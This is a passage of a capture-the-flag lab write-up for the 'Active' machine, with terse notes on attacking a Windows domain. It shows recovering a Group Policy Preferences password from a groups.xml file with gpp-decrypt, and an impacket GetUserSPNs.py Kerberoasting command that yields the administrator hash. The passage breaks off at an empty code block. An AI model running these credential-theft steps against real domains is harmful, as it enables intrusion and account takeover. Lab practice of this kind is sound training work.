...
```bash
	...
	Users           Disk      
```
Replication drive has a groups.xml file.
```bash
<Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
```
password decrypts with gpp-decrypt : GPPstillStandingStrong2k18
# Authenticated LDAP
LDAP with creds can dump the ldap data :)
Getting usernames gives: SVC_TGS and administrator

Check if they are valid with impacket script.
...
# Priv esc
## ASREP with creds
Try GetUserSPN as svc_tgs. 
```bash
python3 /opt/impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
```
Which gives back the admin hash.
```bash
